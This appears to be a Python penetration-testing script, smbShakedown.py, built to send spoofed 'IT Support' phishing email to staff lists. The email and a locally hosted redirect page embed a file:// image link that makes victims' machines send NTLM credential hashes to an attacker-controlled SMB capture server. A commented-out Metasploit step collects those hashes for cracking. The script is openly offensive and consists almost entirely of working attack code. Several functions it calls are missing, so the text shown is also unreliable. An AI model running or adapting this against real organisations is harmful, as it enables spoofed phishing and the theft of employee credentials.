#!/usr/bin/env python
# Description: A simplified SMB Email Client Attack script.
# Created by: Nick Sanzotta / @beamr
# Version: smbShakedown.py v 1.10252016.b

try:
    import os
    import sys
    import smtplib
    import getpass
    import readline
    import socket
    import time
    import urllib
    import json
    import readline
    readline.parse_and_bind("tab: complete")
    import SocketServer
    import SimpleHTTPServer
    import multiprocessing
except Exception as e:
    print('[!] CORE - Module Import Error: %s' % (e))
    sys.exit(1)


def main():
	# cls()
	# print(banner)
	# try:
	# 	extipAddress = get_external_address()
	# except IOError:
	# 	print("Check your Internet connection")
	# 	sys.exit(0)
	# ipAddress = get_internal_address()
	# ipAddress = get_internal_address()
	print("\n")
	smtpServerAddress = raw_input('Enter SMTP Server address[smtp.gmail.com]: ') or 'smtp.gmail.com'
	print('ENTERED: "%s"' % smtpServerAddress + "\n")
	smtpServerPort = raw_input('Enter your SMTP Server Port[587]: ') or 587
	print('ENTERED: "%s"' % smtpServerPort + "\n")
	smtpUser = raw_input('Enter SMTP Server username[****@gmail.com]: ')
	print('ENTERED: *****\n')
	smtpPassword = getpass.getpass(r'Enter SMTP Server password: ')
	print("\n")
	senderName = raw_input('Enter "from name":[IT Support]') or  'IT Support'
	print('ENTERED:' "%s" % senderName + "\n")
	senderAddress = raw_input('Enter "from address":[itsupport@company.com]') or  'itsupport@company.com'
	print('ENTERED:' "%s" % senderAddress + "\n")
	recipientName = raw_input('Enter recipient(s) name[Company Staff]: ') or 'Company Staff'
	print('ENTERED:' "%s" % recipientName + "\n")
	print('TIP: This will help avoid the orange "?" and/or Spoof the recipient. Default value usually works.')
	rcptHeader = raw_input('Enter recipient address for the email header[staff@company.com]') or 'staff@company.com'
	print('ENTERED:' "%s" % rcptHeader + "\n")
	try:
		print('TIP: For multiple addresses, enter a file or seperate with a comma\n'\
		'EX:/opt/emailAddresses.txt or user1@company.com,user2@company.com')
		rawrcptAddress = raw_input('Enter BCC recipient addresses[File or individual email(s)]): ')
		print('ENTERED:' "%s" % rawrcptAddress + "\n")
		with open(rawrcptAddress, 'r') as f1:
			x = f1.read()
		recipientAddress = x.split()
		print(recipientAddress)
		print("\n")
	except IOError:
		recipientAddress=rawrcptAddress.split(',')
		print('ENTERED:' "%s" % recipientAddress + "\n")
	smbCaptureServer = raw_input('Enter SMB Capture Server IP address['+extipAddress+']: ') or  extipAddress
	print('ENTERED:' "%s" % smbCaptureServer + "\n")
	#HYPER LINK OPTIONS
	print('TIP: A HyperLink can be directed to an Webpage with an HTML IMG Tag.')
	hyperLinkOption = raw_input('Would you like to add a HyperLink to your message?[yes]: ') or 'yes'
	print('ENTERED:' "%s" % hyperLinkOption + "\n")
	choice = hyperLinkOption.lower()
	yes = set(['yes','y', 'ye', ''])
	no = set(['no','n'])
	if choice in yes:
		print('TIP: Domain based HyperLinks help avoid the "JunkFolder".')
		hyperAddress = raw_input('Please enter a addresss without "http://": ['+extipAddress+']:' ) or extipAddress
		print("ENTERED: " "%s" % "http://"+hyperAddress+"/" + "\n")
		hyperText = raw_input('Enter text for Hyperlink to be displayed[CLICK ME!]: ') or 'CLICK ME!'
		print("ENTERED: " "%s" % hyperText + "\n")
		hyperLink = '<a href="http://'+hyperAddress+'/" target="_blank">'+hyperText+'</a>' 
		#HTTP Server OPTIONS
		print('TIP: You can point your HyperLink to a locally hosted Webpage.')
		httpServOption = raw_input("Host local Webpage with an HTML IMG Tag?[yes]: ") or 'yes'
		print('ENTERED:' "%s" % httpServOption + "\n")
		choice = httpServOption.lower()
		yes = set(['yes','y', 'ye', ''])
		no = set(['no','n'])
		if choice in yes:
			httpPort = raw_input("HTTP Server Port?:[80]") or 80
			print('ENTERED:' "%s" % httpPort + "\n")
			print("\n")
			print("TIP: Coming soon...")
			#Redirect OPTIONS
			redirectOption = raw_input("Would you like a redirect on your Webpage?[yes]:") or 'yes'
			print('ENTERED:' "%s" % redirectOption + "\n")
			choice = redirectOption.lower()
			yes = set(['yes','y', 'ye', ''])
			no = set(['no','n'])
			if choice in yes:
				redirect = raw_input('Enter redirect address[ex: client-site.com]:') or ''
				print('ENTERED:' "%s" % redirect + "\n")
			elif choice in no:
				print('Okay, Webpage will not redirect:')
				redirect = ''
			else:
				sys.stdout.write("Please respond with 'yes' or 'no'")
		### EDIT: HTML Template Below ###
		### Becareful not to remove the variables {0} and {1} ###
			html = """
			<!DOCTYPE HTML>
			<html lang="en-US">
	    		<head>
	        		<meta charset="UTF-8">
	        		<meta http-equiv="refresh" content="1;url={1}">
	        		<script type="text/javascript">
	            		window.location.href = "{1}"
	        		</script>
	        <title>SMB Egress Test Page.</title>
	    	</head>
			<br>
			<img src=file://{0}/image/foo.gif>
			</body>
			</html>
			"""
			indexHTML = html.format(smbCaptureServer, redirect)
			print(indexHTML)
			print("\n")
			with open('index.html','w+') as f1:
				f1.write(indexHTML)
			print('Starting HTTP Server')
			print('\n...')
			httpPort = 80
			Handler = SimpleHTTPServer.SimpleHTTPRequestHandler
			httpd = SocketServer.TCPServer(("",httpPort), Handler)
			server_process = multiprocessing.Process(target=httpd.serve_forever)
			server_process.daemon = True
			server_process.start()
			print("Python SimpleHTTPServer now Listening on Port: " + str(httpPort))
			print("\n")
		elif choice in no:
			print('Ok local HTTP Server not started: \n')
		else:
			sys.stdout.write("Please respond with 'yes' or 'no'")
			
	
	elif choice in no:
		print('Okay, A Hyplink will not be added to your message: \n')
		hyperLink = ''
	else:
		sys.stdout.write("Please respond with 'yes' or 'no'")

	

	emailMessage = message.format(senderName, senderAddress, recipientName, rcptHeader, smbCaptureServer, hyperLink)
	print('Email Message Template Below:')
	time.sleep(1)
	print(emailMessage)
	smtpConn(smtpServerAddress, smtpServerPort, smtpUser, smtpPassword, senderAddress, recipientAddress, emailMessage)
	time.sleep(1)
	smbServ()
if __name__ == "__main__":
	main()



	# rcfile = 'smbServ.rc'

	# def smbServ():
	# 	smbServOption = raw_input("\nLaunch Metasploit's SMB Capture module?[yes]:") or 'yes'
	# 	choice = smbServOption.lower()
	# 	yes = set(['yes','y', 'ye', ''])
	# 	no = set(['no','n'])
	# 	print('ENTERED: "%s"' % choice + "\n")
	# 	if choice in yes:
	# 		with open(rcfile, 'w') as f1:
	# 			f1.write("use auxiliary/server/capture/smb"+"\n"+\
	# 				"set srvhost "+get_internal_address()+"\n"+\
	# 				"set JOHNPWFILE /opt/smbShakedown/smb_hashes"+"\n"+\
	# 				"exploit -j -z")
	# 		os.system('msfconsole -q -r smbServ.rc')
	# 	elif choice in no:
	# 		print("Ok, remember to setup your SMBCapture Server elsewhere. \n")
	# 	else:
	# 		sys.stdout.write("Please respond with 'yes' or 'no'")